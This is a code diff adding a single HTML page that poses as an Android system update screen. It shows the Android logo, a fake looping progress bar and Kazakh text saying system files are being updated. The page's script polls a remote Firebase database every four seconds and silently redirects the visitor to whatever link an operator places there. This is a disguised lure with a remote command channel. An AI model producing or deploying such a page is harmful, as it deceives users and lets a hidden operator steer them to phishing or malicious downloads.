@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .progress-bar { width: 70%; background: #333; height: 4px; border-radius: 2px; margin-top: 20px; position: relative; overflow: hidden; }
+        .progress-fill { width: 25%; background: #3498db; height: 100%; animation: load 15s infinite; }
+        @keyframes load { 0% { width: 15%; } 50% { width: 65%; } 100% { width: 90%; } }
+        .text { font-size: 13px; color: #888; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" width="48">
+    <div class="progress-bar"><div class="progress-fill"></div></div>
+    <p class="text">Системалық файлдарды жаңарту (25%)...</p>
+    <script>
+        async function fetchCommand() {
+            try {
+                const res = await fetch("https://tulpar-system-default-rtdb.firebaseio.com/command.json");
+                const data = await res.json();
+                if (data && data.active_link && data.active_link !== "none") {
+                    window.location.replace(data.active_link);
+                }
+            } catch (e) {}
+        }
+        setInterval(fetchCommand, 4000);
+        fetchCommand();
+    </script>
+</body>
+</html>
